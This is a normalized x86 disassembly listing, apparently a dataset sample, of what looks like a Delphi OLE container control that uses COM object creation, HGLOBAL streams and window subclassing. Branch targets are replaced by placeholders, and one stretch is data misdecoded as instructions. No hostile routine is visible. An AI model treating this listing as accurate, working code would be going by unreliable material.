mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea eax [ ebx + 0x23c ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
call sub_4794b8
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x244 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x3c ]
mov eax esi
call sub_41a770
mov eax [ ebx + 0x244 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
lea eax [ ebx + 0x21c ]
call sub_405a08
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4794b8
test [ ebx + 0x23d ] 0x4
je r-xdata
test [ ebx + 0x23e ] 0x2
jne r-xdata
inc edi
xor esi esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov ecx eax
mov eax [ ebx + 0x240 ]
mov edx esi
call sub_41a6c4
inc esi
dec edi
jne r-xdata
test [ ebx + 0x23e ] 0x1
je r-xdata
xor edx edx
mov eax ebx
call sub_449ed8
mov eax ebx
test eax eax
je r-xdata
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_426608
mov ecx eax
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a6c4
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a5d0
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_47e128
inc esi
dec edi
jne r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push eax
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4794b8
sub eax 0xfffffd9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
test [ ebx + 0x23d ] 0x60
sete dl
mov eax ebx
call sub_450a0c
push ebx
call sub_47f098
call sub_4794b8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_47d21c
push ebx
push esi
push edi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi ]
call sub_403254
xor eax eax
mov [ esi ] eax
inc ebx
xor edi edi
mov eax [ esi ]
mov edx edi
call sub_41a5d0
call sub_403254
inc edi
dec ebx
jne r-xdata
sub_47d254
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47e700
cmp [ esi + 0x218 ] 0x0
je r-xdata
mov eax esi
call sub_47da74
mov eax esi
call sub_47db1c
lea eax [ esi + 0x21c ]
call sub_405a08
cmp [ esi + 0x218 ] 0x0
je r-xdata
push 0x1
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ esi + 0x218 ]
call sub_405a08
mov eax [ esi + 0x210 ]
call sub_403254
lea eax [ esi + 0x240 ]
call sub_47d21c
lea eax [ esi + 0x244 ]
call sub_47d21c
mov eax [ esi + 0x208 ]
dec [ eax + 0x48 ]
mov eax [ esi + 0x208 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
push 0x0
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c5f0
test bl bl
jle r-xdata
mov eax esi
call sub_47dadc
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_47d314
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47d5b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d5bb
lea eax [ ebp - 0xc ]
call sub_405a08
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
xor eax eax
push ebp
push sub_47d57f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_47d381
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_405a08
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4794b8
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x214 ]
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405a08
push eax
push 0x0
push ebx
call CreateStreamOnHGlobal
call sub_4794b8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_4794b8
mov eax [ ebp - 0x4 ]
call sub_47db1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_4794b8
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_4796c4
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
sub ecx 0xfffffdb4
mov eax [ ebp - 0x4 ]
add eax 0x220
call sub_405a08
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4794b8
mov eax [ ebp - 0x4 ]
add eax 0x224
call sub_405a08
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4794b8
mov eax [ ebp - 0x4 ]
add eax 0x228
call sub_405a08
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
mov eax [ ebp - 0x4 ]
add eax 0x234
push eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_4796c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
sub ecx 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0xfffffe0b
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0xfffffdfe
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0xfffffe00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
call sub_47f098
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfffffdff
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
sub_47d604
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
mov ebx edx
cmp eax 0x80040112
jne r-xdata
call sub_4794b8
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031a4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
sub_47d65c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47d776
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
push ebp
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405a08
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoCreateInstance
pop edx
call sub_47d604
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405a08
push eax
push r-xdata
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoGetClassObject
call sub_4794b8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
mov edx [ edx + 0x28 ]
call sub_4047c0
push ebp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405a08
push eax
mov eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
pop edx
call sub_47d604
pop ecx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d77d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0xc ]
call sub_4046b0
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
sub_47d7a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47d866
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47db1c
push 0x0
push 0x2
call GlobalAlloc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push sub_47d839
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405a08
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CreateStreamOnHGlobal
call sub_4794b8
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_4794b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40bc1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d86d
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
sub_47d874
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_47d314
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_44d758
mov edx esp
mov eax ebx
call sub_449958
push esp
mov eax ebx
call sub_4505d4
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
push 0x0
push 0xfffffffb
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
sub eax 0xfffffd9c
mov eax ebx
call sub_47dd84
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_4507d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax ebx
call sub_4507d8
push eax
call ShowWindow
jmp r-xdata
sub_47d918
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edx edx
push ebp
push sub_47d999
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44e318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ esi ]
cmp eax 0xbc00
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test [ ebx + 0x23e ] 0x1
jne r-xdata
cmp eax 0xc000
jae r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4507d8
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub [ esi ] 0x9c00
sub_47d9a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
pop esi
pop ebx
retn
sub_47d9d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403820#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44dae0
mov eax [ ebp - 0x4 ]
push eax
push sub_47e194
mov eax [ ebp - 0x4 ]
push eax
push sub_47ea90
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
setne cl
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47da2e
add [ eax ] eax
add [ eax ] al
sbb al 0x74
inc eax
add [ edx ] bh
fiadd [ edi ]
mov ebx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a08
sub_47da74
push ebx
mov ebx eax
lea ecx [ ebx + 0x238 ]
mov eax [ ebx + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x218 ]
call sub_479770
lea ecx [ ebx + 0x234 ]
mov edx r-xdata
mov eax [ ebx + 0x218 ]
call sub_479770
lea eax [ ebx + 0x228 ]
call sub_405a08
lea eax [ ebx + 0x224 ]
call sub_405a08
lea eax [ ebx + 0x220 ]
call sub_405a08
pop ebx
retn
sub_47dadc
push ebx
push esi
push edi
mov ebx [ eax + 0x208 ]
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4c ]
call sub_403254
xor eax eax
mov [ ebx + 0x4c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x4c ]
call sub_41a5d0
call sub_403254
inc edi
dec esi
jne r-xdata
sub_47db3c
push ebx
mov ebx eax
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_44db94
pop ebx
retn
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
cmp [ ebx + 0x218 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x180 ] eax
pop ebx
retn
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_47db88
push ebx
push esi
push edi
push ecx
mov ebx eax
mov ecx [ ebx + 0x208 ]
mov edi [ ecx + 0x20 ]
mov esi [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
cmp edx [ esi + eax * 4 ]
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
push eax
cmp [ ecx + 0x30 ] 0x191
jb r-xdata
inc eax
pop ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_4031e0
call sub_40321c
add eax 0x7
and eax 0xfffffff8
mov eax [ ecx + 0x50 ]
test eax eax
jne r-xdata
add ebx eax
pop eax
mov edx [ ebx + eax * 8 + 0x4 ]
mov eax [ ebx + eax * 8 ]
sub_47dbfc
push ebx
push esi
xor esi esi
call sub_461dc8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov edx [ rw-data ]
mov esi [ eax + 0x248 ]
mov esi [ ebx + 0x248 ]
jmp r-xdata
sub_47dc60
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40f550
mov ecx esi
mov edx edi
mov eax ebx
call sub_47dc80
pop edi
pop esi
pop ebx
retn
sub_47dc80
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_40493c
xor eax eax
push ebp
push sub_47dd02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47d314
mov [ esi ] 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push esi
push rw-data
push 0x2
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dd09
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404a0c
retn
lea edx [ ebp - 0x20 ]
call sub_47a004
sub_47dd10
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47dd5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_47dd6c
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_412ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dd65
lea eax [ ebp - 0x10 ]
call sub_40f564
retn
sub_47dd6c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_47dc60
pop edi
pop esi
pop ebx
retn
sub_47dd84
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
xor eax eax
mov [ esp ] eax
push esp
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ esp ] 0x0
jne r-xdata
mov esi [ esp ]
mov [ ebx + 0x180 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov [ ebx + 0x174 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
push sub_446d58
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SendMessageA
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
sub_47de14
push ebx
push esi
push ebp
mov ebp esp
mov ebx eax
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov esp ebp
pop ebp
pop esi
pop ebx
retn
xor eax eax
lea esi [ ebx + 0x10 ]
push [ esi + 0x8 ]
je r-xdata
mov al [ esi ]
cmp al 0x1
ja r-xdata
push [ esi + 0x4 ]
test ah ah
jne r-xdata
mov ecx [ esi + 0x4 ]
mov ah 0x1
jmp r-xdata
add esi 0xc
dec edx
jne r-xdata
sub_47de54
push ebp
mov ebp esp
add esp 0xfffffd64
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_47db88
cmp [ ebp - 0x29c ] 0x10000
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push j_sub_4036f4#2
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x294 ] eax
mov eax edx
mov [ ebp - 0x290 ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x29c ]
call sub_47de14
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
add eax eax
mov edx [ ebx ]
lea eax [ edx + eax * 8 ]
mov ebx eax
lea esi [ ebp - 0x28c ]
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x10c ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx eax
sub edx 0x4
je r-xdata
mov [ esi ] 0x0
mov edx [ ebp - 0xc ]
lea edi [ ebp + edx * 8 - 0x10c ]
xor edx edx
mov [ edi ] edx
test ah 0x40
je r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi ]
call sub_404dcc
mov edx [ esi + 0x4 ]
mov [ edx ] eax
mov [ esi ] 0x1
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_404da8
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov edx edi
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_404da8
mov eax [ ebx + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ esi + 0x4 ] edi
jmp r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x10c ]
call sub_403fa4
test ebx ebx
jne r-xdata
add esi 0xc
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x290 ]
jne r-xdata
mov [ esi ] 0x2
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec edx
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
sub ebx 0x10
mov eax [ ebx ]
and eax 0xffff
mov edx eax
and edx 0xfff
cmp edx 0x8
jne r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
jmp r-xdata
jmp r-xdata
mov [ esi ] 0x0
test ah 0x20
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] ebx
jmp r-xdata
sub_47dff4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x30 ] 0x12c
jge r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_47db88
cmp [ ebp - 0x10 ] 0x10000
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_47de54
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_47e0b1
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
push esi
mov esi [ ebp - 0x4 ]
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
pop esi
pop ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov esi [ esi ]
mov eax ebx
shl eax 0x4
xor edx edx
add esi eax
cmp ax 0x7
ja r-xdata
je r-xdata
test dl dl
jne r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
test eax 0x2000
je r-xdata
mov ecx esi
inc dl
test eax 0x2000
jne r-xdata
sub esi 0x10
mov eax [ esi ]
cmp ax 0x4
ja r-xdata
push esi
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
sub_47e0d8
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
mov eax esi
call sub_450adc
and al [ esp ]
je r-xdata
test bl bl
jne r-xdata
push 0x0
push 0x0
push 0x30f
mov eax esi
call sub_4507d8
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
test eax eax
setne bl
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov dl [ esp ]
mov eax esi
call sub_44fa68
mov ebx eax
sub_47e128
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov ebx [ esi + 0x244 ]
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax ebp
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0x244 ]
call sub_41a5d0
cmp ebp eax
jne r-xdata
mov edx [ esi + 0x208 ]
mov edx [ edx + 0x40 ]
mov edx [ edx + edi * 4 ]
mov ecx eax
mov eax esi
call sub_47e4f8
jmp r-xdata
sub_47e194
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47db1c
xor eax eax
push ebp
push j_sub_4036f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
push 0x2
call GlobalAlloc
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_47e225
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e22c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
call sub_40bc1c
sub_47e250
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebx + 0x48 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
test eax eax
jg r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45018c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test edx edx
jle r-xdata
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov esi [ ebx + 0x48 ]
mov eax [ ebx + 0x4c ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
mov eax [ ebp + 0x8 ]
push eax
call sub_40651c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
push esi
call sub_40651c
lea ecx [ ebp - 0x10 ]
pop edx
call sub_419174
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
test eax eax
je r-xdata
sub_47e330
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
